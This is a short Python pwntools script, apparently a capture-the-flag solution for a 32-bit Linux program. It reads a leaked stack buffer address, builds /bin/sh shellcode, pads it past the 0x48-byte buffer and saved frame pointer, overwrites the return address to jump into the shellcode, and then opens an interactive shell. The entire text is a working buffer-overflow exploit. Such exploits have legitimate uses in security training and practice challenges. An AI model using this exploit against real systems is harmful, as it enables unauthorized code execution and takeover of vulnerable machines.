from parse_args_and_some_func import *

io = all_parsed_args['io']
context.update(arch='i386', os='linux', endian='little')

io.recvuntil("Hei,give you a gift->")
msg = io.recvline()

buf_addr = int16(msg[:-1].decode())
LOG_ADDR('buf_addr', buf_addr)

she = asm(shellcraft.sh())

payload = she + (0x48 + 4 - len(she)) * b'a' + p32(buf_addr)

io.sendafter("what do you want to do?\n", payload)

io.interactive()